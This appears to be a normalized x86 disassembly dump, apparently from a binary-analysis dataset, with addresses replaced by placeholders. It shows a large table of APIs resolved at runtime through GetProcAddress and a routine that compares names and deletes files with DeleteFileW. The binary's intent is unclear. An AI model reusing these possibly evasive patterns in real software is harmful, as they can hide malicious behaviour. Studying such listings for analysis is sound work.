lea eax [ ebp - 0x64 ]
push eax
lea ecx [ esi + 0x57a8 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x88c ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x88c ]
push edx
lea eax [ esi + 0x58b0 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xc94 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xc94 ]
push ecx
lea edx [ esi + 0x59b8 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x7c ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ esi + 0x5ac0 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x678 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x678 ]
push edx
lea eax [ esi + 0x5bc8 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xcd0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xcd0 ]
push ecx
lea edx [ esi + 0x5cd0 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x124 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x124 ]
push eax
lea ecx [ esi + 0x5dd8 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0xc64 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xc64 ]
push edx
lea eax [ esi + 0x5ee0 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x4d8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x4d8 ]
push ecx
lea edx [ esi + 0x5fe8 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x2dc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x2dc ]
push eax
lea ecx [ esi + 0x60f0 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x314 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x314 ]
push edx
lea eax [ esi + 0x61f8 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x154 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x154 ]
push ecx
lea edx [ esi + 0x6300 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x91c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x91c ]
push eax
lea ecx [ esi + 0x6408 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x1e0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x1e0 ]
push edx
lea eax [ esi + 0x6510 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x518 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x518 ]
push ecx
add esi 0x6618
push esi
call sub_1007f580
mov eax [ rw-data ]
mov esi [ GetProcAddress@IAT ]
add esp 0xc
lea edx [ ebp - 0x2f8 ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x9d4 ]
mov [ ecx + 0x104 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x10c ]
mov [ ecx + 0x20c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x170 ]
mov [ ecx + 0x314 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x658 ]
mov [ ecx + 0x41c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x13c ]
mov [ ecx + 0x524 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x7d8 ]
mov [ ecx + 0x62c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xaec ]
mov [ ecx + 0x734 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x34c ]
mov [ ecx + 0x83c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x26c ]
mov [ ecx + 0x944 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0xa4c ] eax
lea edx [ ebp - 0x3bc ]
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x8f8 ]
mov [ ecx + 0xb54 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x820 ]
mov [ ecx + 0xc5c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x8b0 ]
mov [ ecx + 0xd64 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x598 ]
mov [ ecx + 0xe6c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc ]
mov [ ecx + 0xf74 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xdc ]
mov [ ecx + 0x107c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1c4 ]
mov [ ecx + 0x1184 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc38 ]
mov [ ecx + 0x128c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc0c ]
mov [ ecx + 0x1394 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x384 ]
mov [ ecx + 0x149c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2c0 ]
mov [ ecx + 0x15a4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x6e4 ]
mov [ ecx + 0x16ac ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x330 ]
mov [ ecx + 0x17b4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb8c ]
mov [ ecx + 0x18bc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x438 ]
mov [ ecx + 0x19c4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x368 ]
mov [ ecx + 0x1acc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x18c ]
mov [ ecx + 0x1bd4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x964 ]
mov [ ecx + 0x1cdc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x3f8 ]
mov [ ecx + 0x1de4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xac4 ]
mov [ ecx + 0x1eec ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa74 ]
mov [ ecx + 0x1ff4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4b8 ]
mov [ ecx + 0x20fc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x5b8 ]
mov [ ecx + 0x2204 ] eax
push edx
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x478 ]
mov [ ecx + 0x230c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4f8 ]
mov [ ecx + 0x2414 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1a8 ]
mov [ ecx + 0x251c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x69c ]
mov [ ecx + 0x2624 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc4 ]
mov [ ecx + 0x272c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xbb4 ]
mov [ ecx + 0x2834 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x868 ]
mov [ ecx + 0x293c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4c ]
mov [ ecx + 0x2a44 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x418 ]
mov [ ecx + 0x2b4c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x618 ]
mov [ ecx + 0x2c54 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x7fc ]
mov [ ecx + 0x2d5c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xbe0 ]
mov [ ecx + 0x2e64 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb14 ]
mov [ ecx + 0x2f6c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x940 ]
mov [ ecx + 0x3074 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb3c ]
mov [ ecx + 0x317c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x458 ]
mov [ ecx + 0x3284 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x798 ]
mov [ ecx + 0x338c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x94 ]
mov [ ecx + 0x3494 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x498 ]
mov [ ecx + 0x359c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x34 ]
mov [ ecx + 0x36a4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa24 ]
mov [ ecx + 0x37ac ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x250 ]
mov [ ecx + 0x38b4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x6c0 ]
mov [ ecx + 0x39bc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x750 ]
mov [ ecx + 0x3ac4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x5d8 ]
mov [ ecx + 0x3bcc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x5f8 ]
mov [ ecx + 0x3cd4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x72c ]
mov [ ecx + 0x3ddc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x578 ]
mov [ ecx + 0x3ee4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x288 ]
mov [ ecx + 0x3fec ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x844 ]
mov [ ecx + 0x40f4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x708 ]
mov [ ecx + 0x41fc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x234 ]
mov [ ecx + 0x4304 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x9ac ]
mov [ ecx + 0x440c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x9fc ]
mov [ ecx + 0x4514 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x461c ] eax
mov eax [ rw-data ]
lea edx [ ebp - 0x218 ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xac ]
mov [ ecx + 0x4724 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x538 ]
mov [ ecx + 0x482c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2a4 ]
mov [ ecx + 0x4934 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1fc ]
mov [ ecx + 0x4a3c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x3a0 ]
mov [ ecx + 0x4b44 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x988 ]
mov [ ecx + 0x4c4c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb64 ]
mov [ ecx + 0x4d54 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa9c ]
mov [ ecx + 0x4e5c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x638 ]
mov [ ecx + 0x4f64 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x20 ]
mov [ ecx + 0x506c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x3d8 ]
mov [ ecx + 0x5174 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x8d4 ]
mov [ ecx + 0x527c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x558 ]
mov [ ecx + 0x5384 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xf4 ]
mov [ ecx + 0x548c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x774 ]
mov [ ecx + 0x5594 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa4c ]
mov [ ecx + 0x569c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x64 ]
mov [ ecx + 0x57a4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x88c ]
mov [ ecx + 0x58ac ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc94 ]
mov [ ecx + 0x59b4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x7c ]
mov [ ecx + 0x5abc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x678 ]
mov [ ecx + 0x5bc4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xcd0 ]
mov [ ecx + 0x5ccc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x5dd4 ] eax
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc64 ]
mov [ ecx + 0x5edc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4d8 ]
mov [ ecx + 0x5fe4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2dc ]
mov [ ecx + 0x60ec ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x314 ]
mov [ ecx + 0x61f4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x154 ]
mov [ ecx + 0x62fc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x91c ]
mov [ ecx + 0x6404 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1e0 ]
mov [ ecx + 0x650c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x518 ]
mov [ ecx + 0x6614 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x671c ] eax
jmp r-xdata
sub_10036f94
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_10037434
pop ecx
pop ebp
retn
sub_10036fc3
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1006ee94
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1000f103
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10054390
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x1c
sub_10037040
push ebp
mov ebp esp
push 0xffffffff
push sub_10089b61
mov eax [ fs : 0x0 ]
push eax
sub esp 0x274
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor ebx ebx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x278 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_10006be0
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x260 ]
push ebx
push ecx
call sub_1007f8f0
add esp 0xc
lea ecx [ ebp - 0x260 ]
call sub_10063850
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x268 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x26c ]
mov [ ebp - 0x26c ] ebx
mov [ ebp - 0x268 ] ebx
call sub_100310b0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x26c ] ebx
jne r-xdata
push 0x1
call sub_1002e3ac
add esp 0x4
push eax
lea ecx [ ebp - 0x274 ]
mov [ ebp - 0x274 ] ebx
mov [ ebp - 0x270 ] ebx
call sub_10002ce0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x274 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x268 ]
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x260 ]
push ecx
lea ecx [ ebp - 0x26c ]
call sub_1001ee70
test eax eax
je r-xdata
lea eax [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x26c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov esi [ ebp - 0x26c ]
cmp esi ebx
jne r-xdata
lea eax [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x26c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ebx esi
call sub_10011800
test eax eax
je r-xdata
lea eax [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x26c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea edx [ ebp - 0x40 ]
mov eax 0x68
call sub_10069020
lea edx [ ebp - 0x1c ]
mov eax 0x37
call sub_10069020
lea edx [ ebp - 0x58 ]
mov eax 0xd7
call sub_10069020
lea edx [ ebp - 0x2c ]
mov eax 0x108
call sub_10069020
mov edi [ esi + 0x12c ]
mov [ ebp - 0x264 ] edi
test edi edi
je r-xdata
lea eax [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x26c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x6
jmp r-xdata
lea eax [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x26c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10039fc0
xor eax eax
jmp r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
mov edx [ edi + 0x4 ]
mov [ ebp - 0x264 ] edx
cmp [ esi + 0x4 ] 0x2
je r-xdata
mov edi [ ebp - 0x264 ]
mov eax [ esi + 0x1c ]
mov ebx [ lstrcmpW@IAT ]
lea ecx [ ebp - 0x40 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
lea edx [ ebp - 0x1c ]
push edx
push eax
call ebx
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
lea ecx [ ebp - 0x58 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
lea ebx [ ebp - 0x2c ]
mov edi esi
call sub_10052090
mov eax [ esi + 0x14 ]
lea edx [ ebp - 0x278 ]
push edx
lea ecx [ ebp - 0x27c ]
push ecx
call sub_100505a0
add esp 0x8
test eax eax
je r-xdata
lea edi [ ebp - 0x278 ]
lea ecx [ ebp - 0x27c ]
mov edx esi
call sub_10041990
mov ecx [ ebp - 0x27c ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ esi + 0x14 ]
push esi
call [ DeleteFileW@IAT ]
mov edi [ ebp - 0x264 ]
mov edx [ ebp - 0x264 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x264 ] eax
jmp r-xdata
cmp [ ebp - 0x264 ] 0x0
jne r-xdata
sub_100373c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
push r--data
lea eax [ esp + 0x18 ]
push 0x40
push eax
mov edi ecx
call sub_1000f103
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ esp + 0x24 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
push eax
push ecx
push esi
push edi
call sub_10012150
mov ecx [ esp + 0x84 ]
add esp 0x30
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x18
sub_1003744b
push 0x8
push r--data
call sub_1007fad0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1007fb15
retn
push 0xd
call sub_1002f3c9
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100374f8
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_1001b2d2
pop ecx
push 0xc
call sub_1002f3c9
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_10038bf1
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10037504
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_1001b2d2
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_1000a2a1
pop ecx
sub_10037514
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_1003a6bb
mov [ eax ] ebx
call sub_1005b670
mov [ eax ] 0x9
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1003a6bb
mov [ eax ] ebx
call sub_1005b670
mov [ eax ] 0x9
jmp r-xdata
call sub_1003a6bb
mov [ eax ] ebx
call sub_1005b670
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_1004b131
jmp r-xdata
or eax 0xffffffff
